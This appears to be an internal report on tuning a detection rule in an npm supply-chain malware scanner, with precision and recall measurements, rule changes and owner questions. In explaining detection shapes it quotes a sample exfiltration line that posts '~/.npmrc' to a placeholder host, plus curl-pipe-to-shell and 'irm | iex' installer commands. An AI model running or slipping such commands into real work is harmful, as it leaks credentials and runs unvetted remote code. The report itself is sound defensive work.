# Precision round 9, agent Q (`npm.install-download`)

Base: main `2baac25`. Replay set: the 3,716 verdicted versions (`~/kitsunox-scratch/r8/integ-out/full.jsonl`
= main), Stages 1-4 replayed per version with the real code (`replay.py`) on the 425 versions
where `npm.install-download` fires on main (the changes only take findings of this rule away),
merged back into main's full replay and counted with today's verdicts (`relabel.py`). Live:
every candidate of the 188 runs on disk (`20261110T034425Z` .. `20261112T162732Z`) on which the
rule fired as recorded, 678 versions, recomputed from its tarball with main's and with the new
Stage 3 rule and re-decided with its other recorded findings (`s/live.py`, `s/livecmp.py`).
`vm-day1`: `pipeline+4` (`dd.py`) with the new code on the 838 malicious samples the rule fires
on in round 8's full main dump. Scripts and outputs: `~/kitsunox-scratch/r9/Q/{s,*.jsonl}`.

| # | Commit | Target | Change | Benign removed (replay) | Benign removed (live) | Positives lost | Unverified lost | `vm-day1` lost |
|---|---|---|---|---|---|---|---|---|
| Q1 | `9058d91` | `@lightdash/cli` | v5: a shell `curl`/`wget` captured into a variable that stays data | 0 (1 loses the finding) | 36 (+8 not yet verdicted) | 0 | 0 | 0 |
| Q2 | `9410920` | `@lark-codem/codem-core-win32-*` | v4: inline `node -e` code read once, as JavaScript | 0 | 10 (+1 not yet verdicted) | 0 | 0 | 0 |
| Q3 | `a5a3175` | `praana` | v6: v3's "only shown" test follows one local variable | 0 (2 lose the finding) | 1 | 0 | 0 | 0 |
| Q4 | (this commit) | `botmux` (recall) | `npm.install-persistence` v7: `shell-rc` counts on unchanged install code | 0 added | 0 verdicted benign added; +4 unwanted; +181 not yet verdicted | 0 | 0 | 0 (adds only) |

Replay set, today's verdicts:

| replay | reported | benign | unwanted | malicious | unverified | precision |
|---|---|---|---|---|---|---|
| main (`2baac25`) | 1,425 | 714 | 642 | 49 | 20 | 49.18% |
| Q1 + Q2 + Q3 | 1,425 | 714 | 642 | 49 | 20 | 49.18% |

The rule stops firing on 3 replay-set versions, all benign and all still reported by other
rules: `@meetsilicon/cli@1.0.1` (Q1: the same `track.sh` telemetry shape),
`@nuwax-ai/nuwa-browser-mcp@0.6.0-beta.13` and `praana@0.17.0` (Q3: an installer line kept in a
`const` that is only printed). No other decision or finding of the rule changes on the 425.

Live runs on disk (678 versions where the rule fired as recorded; each recomputed from its
tarball with main's and with the new rule, re-decided with its other recorded findings). Every
change is in the three clusters; distinct versions, today's verdicts:

| Cluster | Target | Fires, main -> new | Reported, main -> new | Verdicts |
|---|---|---|---|---|
| `@lightdash/cli` 3.209.0 .. 3.234.6 | Q1 | 44 -> 0 | 44 -> 0 | 36 benign, 8 not yet verdicted |
| `@lark-codem/codem-core-win32-arm64-gnu` | Q2 | 9 -> 0 | 9 -> 0 | 8 benign, 1 not yet verdicted (`0.8.88`) |
| `@lark-codem/codem-core-win32-x64-msvc` | Q2 | 2 -> 0 | 2 -> 0 | 2 benign |
| `praana@0.20.0` | Q3 | 1 -> 0 | 1 -> 0 | 1 benign |

(55 run rows: some versions sit in two runs.) 0 malicious, unwanted or unverified versions
change. Live benign removed: 47 verdicted versions, plus 9 not yet verdicted of the same shapes.

**Found on the way (main, not this branch): round 8 P2 (v3) unreports `botmux` live.**
Main's recompute no longer fires on `botmux` 3.59.2, 3.59.3, 3.59.4 and 3.59.5 (all
**unwanted** under the owner's ruling of 2026-11-09: the global-install postinstall appends a
PATH line to shell startup files), and they have no other finding, so main stops reporting
them. They were reported only by this rule, by accident: `scripts/postinstall-bin.mjs:335`
prints the advice "standalone installer: curl -fsSL
https://raw.githubusercontent.com/deepcoldy/botmux/...", which made the code "reach the
network" (the 3.59.5 verdict note says the hit is a printed string). P2 is right for this rule;
the gap is that `npm.install-persistence` doesn't report `install-path-entry.mjs`'s shell-rc
append. Identical before and after this branch (no Q change touches them). Owner question 2.
`@companion-ai/feynman@0.5.68` (benign) is also cleared by main's v3.

## Q1. `@lightdash/cli`: a shell capture that stays data (v5)

**Why it fired.** The install hook runs `track.sh`. Its only matched line is
`INSTALLATION_ID=$(curl -s 'https://www.uuidgenerator.net/api/version4')`: a `curl` with a
literal URL on a third-party host, so `fetch`. The UUID goes into a JSON body that `curl -d
"$DATA" ... "$URL" > /dev/null` (or `wget --post-data`) sends to `analytics.lightdash.com`; that
request names its URL through a variable and never matched. Nothing fetched runs or is saved.

**Change.** `lang.shell.fetched_as_data`, used for `curl`/`wget` commands in `.sh`/`.bash`/
`.zsh` install scripts only:

- the line is only `NAME=$(curl|wget ...)` with a constant command inside (no `$`, backtick,
  pipe or nested command, so no local data in the URL);
- the response stays in the variable (curl without `-o`/`-O`/`--output`/`--remote-name`/
  `--config`, also inside `-sSLo`; wget only with `-O -`);
- every use of the variable, and of every variable assigned from it, is in another
  assignment's value, a test, or the data or a header of a `curl`/`wget` request, on a line
  with no pipe, file redirect, command substitution or running/writing command word.

**Why not narrower or wider.** The brief's "to a host the package names as its own" can't hold:
the capture's host is a third-party UUID service; only the POST goes to the vendor's host. The
shape is the text's fate, not its host. A use as the command word, after `eval`, as a function
argument (not followed), in another URL, piped or redirected keeps it a download (tests in
`tests/lang/test_shell.py`). A download URL in the capture (`$(curl -s https://x/kx.tar.gz)`)
still counts through the URL form. Not extended to a `curl` whose output goes to `/dev/null`:
that is the exfiltration shape (`curl -d "$(cat ~/.npmrc)" https://x > /dev/null`), and a
`vm-day1` sample is reported by this rule alone with a `wget` beacon
(`overstock-health-express@1.4.4`).

**Measured.** Live: all 44 `@lightdash/cli` versions on disk (36 benign, 8 not yet verdicted)
stop firing and are no longer reported (left with `static.npm-publish`, LOW). Replay set: `@meetsilicon/cli@1.0.1` (benign, same `track.sh`
shape) loses the finding and stays reported (`npm.install-hook`).

## Q2. `@lark-codem/codem-core-win32-*`: inline `node -e` code (v4)

**Why it fired.** The postinstall is `node -e "var f=require('path').join(__dirname,
'codem-core.exe'),fs=require('fs');try{fs.chmodSync(f,0o755)}catch(e){}"` (only a `chmod` of
the shipped binary). The rule reads the hook line as shell text, where `_START` lets a command
begin after a quote, so `'codem-core.exe'` matched `EXE_COMMAND` (`exe` form: "runs a Windows
executable"). In a hook line every match counts (no runner test). The same code is already an
install file of its own, `package.json#scripts.postinstall.js` (`install.install_sources`), where
the string, handed only to `path.join`, is not run and doesn't fire.

**Change.** The hook line's inline code is blanked (`install.inline_blanked`, offsets kept) when
the inline file holds exactly that code; the rest of the line is read as before. A registry
manifest whose hook differs from the tarball's is read as it is.

**Measured.** Live: all 11 win32 builds whose tarball Stage 3 read (10 benign, 1 not yet
verdicted) stop firing and are no longer reported (no other finding). The other
`win32-x64-msvc` builds are over Stage 2's size cap and never fired. Replay set: no change (the builds are newer than the set).
The `linux-x64-gnu` builds (8 benign) are reported by `npm.install-script-code` +
`static.process-exec`, not by this rule, and are out of this target. `geelark-cli@1.0.31`
(named with this target) is a different shape: `install.js` downloads its own binary from its
GitHub release when the installed `@geelark-tech/cli-<platform>` package lacks it (`own`
form). Decision 0015 calls an own-release download unwanted, checksum or not; the reviewer ruled
it benign as a dead path. Not changed: owner's call (question 1).

## Q3. `praana`: a command word kept in a variable only shown (v6)

**Round 8 P2 doesn't cover it.** Main (v3) still reports `praana@0.20.0` live (recomputed:
fires, reported). Its postinstall builds `const installer = platform === "win32" ? \`irm
${INSTALL_PS1_URL} | iex\` : \`curl -fsSL ${INSTALL_SH_URL} | sh\`` and returns it in the lines
of a notice. `shown_not_run` stops at the assignment ("a string assigned to a variable is not
shown only"), so `curl` made the code reach the network and the exported
`raw.githubusercontent.com/amitkumardubey/praana/main/install.sh|.ps1` URLs read as `fetch` and
`own` downloads. The gloom pair is covered by P2: `@gloom-sh/terminal` and `gloomberb` 0.20.8
and 0.20.9 all no longer fire with main's code (the 0.20.9 pair was verdicted after round 8's
measurement but before its merge reached the collector).

**Change.** `lang.javascript.shown_or_kept` (only this rule's network test uses it): also a
string that is the value of a `const`/`let`/`var` (through `+`, templates and ternaries), not
exported, whose every reference in the file is itself only shown or kept as data
(`shown_not_run`'s walk from the reference). A reference handed to a runner, assigned on, used
as a value or passed as `{ cmd }` keeps the old answer.

**Measured.** Live: `praana@0.20.0` (benign) stops firing and is no longer reported. Replay set: `praana@0.17.0` and `@nuwax-ai/nuwa-browser-mcp@0.6.0-beta.13`
(benign; `const INSTALL_CMD = "curl ... | bash"` only printed in `console.warn`) lose the finding
and stay reported by their other install rules.

**Residual risk.** A command string kept in a variable that is returned or listed and run by the
caller is not followed (P2's known limit, one level further); the command itself, when handed
to a runner in the same file, still fires.

## Q4. `botmux`: shell start-up writes in unchanged install code (`npm.install-persistence` v7)

Added at the coordinator's request after the first report (owner question 2 above).

**Why main misses it.** `botmux` 3.59.2-3.59.5 (unwanted, owner ruling of 2026-11-09:
a global install's postinstall appends a PATH line to the shell start-up files) ship the
same install code as the release before. `npm.install-persistence` finds the `shell-rc` form
in it (`persistence()`: the `.zshrc`/`.bashrc` names in `scripts/install-path-entry.mjs` reach
a write) but counts only `agent` on unchanged install code (`ALWAYS_FORMS`, round 8 R2).

**Change.** `ALWAYS_FORMS = {"agent", "shell-rc"}`. `shell-rc` is the only form that covers
`botmux`. `path` and `system-package` stay changed-only.

**Where round 8 R's 22 benign came from.** Its variant A (every form on unchanged code) added
`glimmervoid` 0.48.2-next.316 ... 0.52.3-next.901 (17, all `path`: a PATH help text in a
bundled chunk) and `agentiqa` 1.1.50-staging.* (4, all `system-package`: an install hint),
re-read from `~/kitsunox-scratch/r8/R/sub-t2a.jsonl` vs `sub-t2b.jsonl`. None came from
`shell-rc`, so this variant adds none of them. (Live, `path` would fire on unchanged code in
`glimmervoid` 20 benign + 699 unverdicted versions and `system-package` in `agentiqa` 5 + 100.)

**Measured.**

- Replay set: R's variant A finds `shell-rc` on unchanged code in 21 versions
  (`persistence()` is unchanged since R). Replayed with v7 (`q4-rc.jsonl`): all 21 were
  already reported, so no decision changes. Before and after: 1,425 reported, 718 benign,
  645 unwanted, 49 malicious, 13 unverified, 49.15% (today's verdicts, which moved since the
  Q1-Q3 table).
- Live runs on disk (`s/hookcount.py`, `s/rcscan.py`, `s/persistlive.py`): 22,644 updates with an
  install hook that Stage 3 read; `shell-rc` on unchanged install code in 208. With v7:
  **+4 unwanted** (`botmux` 3.59.2, 3.59.3, 3.59.4, 3.59.5, confirmed by a full Stages 1-4
  replay, `livepos-q4.jsonl`), **0 benign verdicted added**, 0 lost, and **181 versions not
  yet verdicted newly reported** (22 already reported). The 181, by package: `@arbidocs/cli` 47,
  `@zenera/cli` 28, `@tiens.nguyen/gu-cli` 24, `@lenne.tech/cli` 17, `agent-takkub` 17, `botmux`
  8 (earlier releases), `@cheongfish/bouncer` 5, `@codemieai/code` 5, `e10-login` 5,
  `bridge-agent` 4, `terminal-commander` 4, `@aui.io/apollo` 3, `@asyncapi/cli` 2,
  `@action-test-ash17290/asyncapi-cli-release-test-20261022` 2, `@gw-tools/gw` 2,
  `vibe-coding-wrapped` 2, and 1 each of `@symbols-cli/cli`, `@xfe-repo/cli`,
  `@zhuan-ai/zhuanspec`, `coding-friend-cli`, `grix-connector`, `repilot`. Spot-checked
  evidence: install-time appends of shell completion blocks or PATH/env lines to
  `~/.zshrc`/`~/.bashrc`/profiles, unwanted by the ruling. **Likely benign: `bridge-agent` x4**
  (its 0.26.59 is verdicted benign: the rc line is in a script the postinstall only copies to
  `~/.bridge`, run later by the daemon on request).
  The runs on disk span 2026-10-29 to 2026-11-12, about 13 new reports a day.
- `vm-day1`: the change only adds findings, so nothing is at risk (0 lost).

**Other live positives main doesn't report** (replay of every verdicted unwanted/malicious
version on disk outside the replay set, 673, with main and with this branch,
`livepos-{main,q4}.jsonl`): main misses 12. The branch reports the 4 `botmux` versions and
still misses 8: `@cgh567/agent@2.6.60`, `@plannotator/opencode@0.28.45`,
`local-operator-ui@0.52.8`, `lumen-lib@2.1.8` (never routed, score 0);
`@ntdev204/laris-cli@1.5.2` (live by `correlate.follow-on`, which the replay can't rebuild;
its own unchanged postinstall's form is `path`, which v7 leaves changed-only);
`doc-detective@5.0.0-v5-rc.16` (replay loses `npm.install-script-code`, score 3 LOW-only);
`mentiondock@0.1.7` (replay loses its `npm.install-persistence`, recorded live); and
`pdf-html5-page-flip@2.0.2` (malicious, LOW-only score 3, never reported). On the replay set,
main leaves 39 positives unreported (8 malicious: `@atedone/workspace-context` 0.0.23-0.0.25,
`bfvkjmeikpwhqxc` 1.0.0 and 1.0.1, `calculator-preinstall-chain-demo@1.1.2`,
`dependencykfeg@25.1.9`, `tailwindcss-animate-bridge@2.0.8`; 31 unwanted), and v7 reports
none of them.

## `vm-day1`

The rule fires on 838 reported malicious samples in round 8's full main dump
(`dd-main-full.jsonl`); 24 would stop being reported without it (`ddrisk.py`: `esoftplay` x20
`[npx]`, `aicp-tracker` 1.1.7 and 1.3.4 `[downloader]`, `n8n-nodes-zalo-fevox@0.6.8`
`[guard]`, `overstock-health-express@1.4.4` `[fetch]`, a `wget` beacon in the hook line). None
is a shell capture, an inline `node -e` hook or a command word kept in a JavaScript variable.
`pipeline+4` with Q1 + Q2 + Q3 on those 24 (`dd-all-atrisk.jsonl`): the rule fires on 24 of 24,
all 24 reported. **0 lost.** All 838 samples the rule fires on, with Q1 + Q2 + Q3
(`dd-all-fired.jsonl`, `s/ddcmp.py`): the rule still fires on 838 of 838, 838 reported, 0 lost,
0 errors.

## Owner questions

1. `geelark-cli@1.0.31`: a GitHub-release fallback that runs only when the registry platform
   package lacks its binary. Keep reported under decision 0015, or exempt "fallback behind an
   `existsSync` of the platform package's binary"? Not built.
2. `botmux` 3.59.2-3.59.5 (unwanted, shell-rc PATH append) are unreported by main since round
   8 P2 (above). Built as Q4 (`npm.install-persistence` v7). It also newly reports 181
   unverdicted live versions over two weeks of runs (about 13 a day), shell-rc writes the
   ruling calls unwanted. Keep?

## Reproduce

```sh
Q=~/kitsunox-scratch/r9/Q; PY=/home/thestair/kitsunox/.venv/bin/python
bash ~/kitsunox-scratch/r8/R/scripts/k_replay.sh $Q/all/src $Q/all-sub.jsonl $Q/fired.keys
python3 -I $Q/s/merge.py ~/kitsunox-scratch/r8/integ-out/full.jsonl $Q/all-sub.jsonl $Q/all-full.jsonl
python3 -I ~/kitsunox-scratch/r5/final/relabel.py ~/kitsunox-scratch/r8/integ-out/full.jsonl $Q/all-full.jsonl
$PY -I $Q/s/live.py $Q/main/src > $Q/live-main.jsonl; $PY -I $Q/s/live.py $Q/all/src > $Q/live-all.jsonl
python3 -I $Q/s/livecmp.py $Q/live-main.jsonl $Q/live-all.jsonl
bash ~/kitsunox-scratch/r5/K/scripts/k_dd.sh $Q/all/src $Q/dd-all-fired.jsonl $Q/dd-fired.keys
```
